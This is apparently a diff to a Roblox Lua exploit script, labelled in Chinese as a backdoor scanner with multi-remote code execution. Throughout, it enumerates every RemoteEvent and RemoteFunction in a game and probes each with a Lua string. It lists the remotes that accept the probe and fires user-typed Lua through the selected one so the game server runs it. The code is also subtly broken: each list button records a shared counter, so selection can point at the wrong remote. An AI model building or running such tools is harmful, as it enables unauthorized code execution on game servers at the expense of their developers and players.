@@ -6,30 +6,30 @@ local Workspace = game:GetService("Workspace")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local RobloxReplicatedStorage = game:GetService("RobloxReplicatedStorage")
 local JointsService = game:GetService("JointsService")
+local UserInputService = game:GetService("UserInputService")
 
 local LocalPlayer = Players.LocalPlayer
 
--- UI界面创建（可拖动、输入、状态提示）
+-- UI界面创建（可拖动、输入、远程选择、状态提示）
 local ScreenGui = Instance.new("ScreenGui")
 ScreenGui.Name = "后门扫描器"
 ScreenGui.Parent = CoreGui
 ScreenGui.ResetOnSpawn = false
 
 local MainFrame = Instance.new("Frame")
-MainFrame.Size = UDim2.new(0, 420, 0, 280)
-MainFrame.Position = UDim2.new(0.5, -210, 0.5, -140)
+MainFrame.Size = UDim2.new(0, 480, 0, 340)
+MainFrame.Position = UDim2.new(0.5, -240, 0.5, -170)
 MainFrame.BackgroundColor3 = Color3.fromRGB(30, 50, 80)
 MainFrame.Parent = ScreenGui
 MainFrame.Active = true
 MainFrame.Draggable = true
 
-local UICorner = Instance.new("UICorner", MainFrame)
-UICorner.CornerRadius = UDim.new(0, 18)
+Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 18)
 
 local Title = Instance.new("TextLabel", MainFrame)
 Title.Size = UDim2.new(1, 0, 0, 38)
 Title.Position = UDim2.new(0, 0, 0, 0)
-Title.Text = "后门扫描器 & 远程执行"
+Title.Text = "后门扫描器 & 多远程漏洞执行"
 Title.TextColor3 = Color3.fromRGB(255, 255, 255)
 Title.BackgroundTransparency = 1
 Title.Font = Enum.Font.Fondamento
@@ -44,10 +44,29 @@ Status.BackgroundTransparency = 1
 Status.Font = Enum.Font.Fondamento
 Status.TextSize = 15
 
+local RemoteLabel = Instance.new("TextLabel", MainFrame)
+RemoteLabel.Size = UDim2.new(1, -20, 0, 26)
+RemoteLabel.Position = UDim2.new(0, 10, 0, 66)
+RemoteLabel.Text = "请选择远程函数"
+RemoteLabel.TextColor3 = Color3.fromRGB(255, 230, 120)
+RemoteLabel.BackgroundTransparency = 1
+RemoteLabel.Font = Enum.Font.Fondamento
+RemoteLabel.TextSize = 16
+
+local RemoteList = Instance.new("ScrollingFrame", MainFrame)
+RemoteList.Size = UDim2.new(0.45, 0, 0, 130)
+RemoteList.Position = UDim2.new(0.03, 0, 0, 96)
+RemoteList.BackgroundColor3 = Color3.fromRGB(45, 55, 110)
+RemoteList.ScrollBarThickness = 8
+RemoteList.CanvasSize = UDim2.new(0, 0, 0, 0)
+RemoteList.BorderSizePixel = 0
+
+Instance.new("UICorner", RemoteList).CornerRadius = UDim.new(0, 10)
+
 local InputBox = Instance.new("TextBox", MainFrame)
-InputBox.Size = UDim2.new(0.95, 0, 0, 80)
-InputBox.Position = UDim2.new(0.025, 0, 0, 74)
-InputBox.PlaceholderText = "在此输入要远程执行的Lua代码"
+InputBox.Size = UDim2.new(0.48, 0, 0, 130)
+InputBox.Position = UDim2.new(0.51, 0, 0, 96)
+InputBox.PlaceholderText = "在此输入你要远程执行的Lua代码"
 InputBox.Text = ""
 InputBox.BackgroundColor3 = Color3.fromRGB(50, 70, 120)
 InputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -57,8 +76,8 @@ InputBox.ClearTextOnFocus = false
 
 local ScanBtn = Instance.new("TextButton", MainFrame)
 ScanBtn.Size = UDim2.new(0.45, 0, 0, 36)
-ScanBtn.Position = UDim2.new(0.05, 0, 0, 170)
-ScanBtn.Text = "扫描后门"
+ScanBtn.Position = UDim2.new(0.03, 0, 0, 240)
+ScanBtn.Text = "扫描全部远程"
 ScanBtn.BackgroundColor3 = Color3.fromRGB(100, 200, 100)
 ScanBtn.TextColor3 = Color3.fromRGB(0,0,0)
 ScanBtn.Font = Enum.Font.Fondamento
@@ -66,16 +85,15 @@ ScanBtn.TextSize = 17
 
 local ExecuteBtn = Instance.new("TextButton", MainFrame)
 ExecuteBtn.Size = UDim2.new(0.45, 0, 0, 36)
-ExecuteBtn.Position = UDim2.new(0.5, 0, 0, 170)
-ExecuteBtn.Text = "执行代码"
+ExecuteBtn.Position = UDim2.new(0.51, 0, 0, 240)
+ExecuteBtn.Text = "执行选中远程"
 ExecuteBtn.BackgroundColor3 = Color3.fromRGB(120, 170, 255)
 ExecuteBtn.TextColor3 = Color3.fromRGB(0,0,0)
 ExecuteBtn.Font = Enum.Font.Fondamento
 ExecuteBtn.TextSize = 17
 
-local FoundRemotes = {}   -- 远程事件列表
-local attached = false
-local backdoor = nil
+local allRemotes = {}
+local selectedRemoteIdx = nil
 
 -- 远程事件过滤与检测
 local function validRemote(rm)
@@ -92,112 +110,90 @@ end
 
 -- 多线程递归扫描所有远程事件
 local function scanAllRemotes()
-    FoundRemotes = {}
+    allRemotes = {}
+    RemoteList:ClearAllChildren()
     Status.Text = "状态：正在扫描（多线程）..."
-    local scanned = 0
-    local found = 0
-
     local candidates = {}
-
-    -- 获取所有可用根节点
     for _, obj in ipairs(game:GetDescendants()) do
-        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
+        if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) and validRemote(obj) then
             table.insert(candidates, obj)
         end
     end
-
-    -- 多线程验证所有远程事件
-    local threads = {}
-    for _, remote in ipairs(candidates) do
-        table.insert(threads, task.spawn(function()
-            scanned = scanned + 1
-            if validRemote(remote) then
+    Status.Text = ("状态：找到 "..#candidates.." 个远程，测试可用性中...")
+    local found = 0
+    for idx, remote in ipairs(candidates) do
+        task.spawn(function()
+            local canUse = false
+            local ok, _ = pcall(function()
+                if remote.ClassName == "RemoteEvent" then
+                    remote:FireServer("print('test')" )
+                elseif remote.ClassName == "RemoteFunction" then
+                    remote:InvokeServer("print('test')")
+                end
+            end)
+            if ok then
+                canUse = true
                 found = found + 1
-                table.insert(FoundRemotes, remote)
-            end
-        end))
-    end
-
-    repeat
-        Status.Text = string.format("状态：已扫描%d个，发现%d个远程", scanned, found)
-        task.wait(0.2)
-    until scanned == #candidates
-
-    Status.Text = "状态：扫描完成，找到"..found.."个可疑远程"
-    return #FoundRemotes > 0
-end
-
--- 后门利用检测
-local function tryAttach()
-    attached = false
-    backdoor = nil
-    for _, remote in ipairs(FoundRemotes) do
-        local success, result = pcall(function()
-            if remote.ClassName == "RemoteEvent" then
-                remote:FireServer("print('test')")
-            elseif remote.ClassName == "RemoteFunction" then
-                remote:InvokeServer("print('test')")
+                allRemotes[#allRemotes+1] = remote
+                -- 加到列表UI
+                local btn = Instance.new("TextButton")
+                btn.Size = UDim2.new(1, -8, 0, 24)
+                btn.Position = UDim2.new(0, 0, 0, (found-1)*26)
+                btn.Text = string.format("[%d] %s (%s)", found, remote.Name, remote.ClassName)
+                btn.TextColor3 = Color3.fromRGB(255,255,255)
+                btn.BackgroundColor3 = Color3.fromRGB(55, 80, 110)
+                btn.Font = Enum.Font.Fondamento
+                btn.TextSize = 15
+                btn.Parent = RemoteList
+                btn.MouseButton1Click:Connect(function()
+                    selectedRemoteIdx = found
+                    RemoteLabel.Text = "已选远程："..remote.Name.." ("..remote.ClassName..")"
+                end)
+                RemoteList.CanvasSize = UDim2.new(0, 0, 0, found*26)
             end
         end)
-        if success then
-            attached = true
-            backdoor = remote
-            break
-        end
+        task.wait(0.015)
     end
-    if attached then
-        Status.Text = ("状态：已连接后门 ["..backdoor.Name.."]")
-        return true
-    else
-        Status.Text = "状态：未发现可利用后门"
-        return false
-    end
+    Status.Text = "状态：扫描完成，找到"..found.."个可用远程"
 end
 
--- 代码执行
-local function executeScript(script)
-    if not attached or not backdoor then
-        Status.Text = "状态：未连接后门，无法执行"
+-- 执行选中远程
+local function executeSelectedRemote(code)
+    if not selectedRemoteIdx or not allRemotes[selectedRemoteIdx] then
+        Status.Text = "状态：请先选中远程函数"
         return
     end
-    local toRun = script or InputBox.Text
+    local remote = allRemotes[selectedRemoteIdx]
+    local toRun = code or InputBox.Text
     if not toRun or toRun == "" then
         Status.Text = "状态：请输入要执行的代码"
         return
     end
     local ok, err = pcall(function()
-        if backdoor.ClassName == "RemoteEvent" then
-            backdoor:FireServer(toRun)
-        elseif backdoor.ClassName == "RemoteFunction" then
-            backdoor:InvokeServer(toRun)
+        if remote.ClassName == "RemoteEvent" then
+            remote:FireServer(toRun)
+        elseif remote.ClassName == "RemoteFunction" then
+            remote:InvokeServer(toRun)
         end
     end)
     if ok then
-        Status.Text = "状态：代码已发送"
+        Status.Text = "状态：代码已发送到 "..remote.Name
     else
         Status.Text = "状态：代码执行失败："..tostring(err)
     end
 end
 
--- 按钮绑定
 ScanBtn.MouseButton1Click:Connect(function()
-    local ok = scanAllRemotes()
-    if ok then
-        if tryAttach() then
-            Status.Text = "状态：已连接后门，可执行代码"
-        else
-            Status.Text = "状态：未发现可用后门"
-        end
-    else
-        Status.Text = "状态：未发现任何远程事件"
-    end
+    scanAllRemotes()
+    selectedRemoteIdx = nil
+    RemoteLabel.Text = "请选择远程函数"
 end)
 
 ExecuteBtn.MouseButton1Click:Connect(function()
-    executeScript(InputBox.Text)
+    executeSelectedRemote(InputBox.Text)
 end)
 
--- 拖动优化（已用Draggable，保留备用）
+-- 可拖动优化（已用Draggable，保留备用）
 local dragging, dragInput, dragStart, startPos
 MainFrame.InputBegan:Connect(function(input)
     if input.UserInputType == Enum.UserInputType.MouseButton1 then
@@ -223,3 +219,4 @@ end)
 
 -- 初始状态
 Status.Text = "状态：未扫描"
+RemoteLabel.Text = "请选择远程函数"
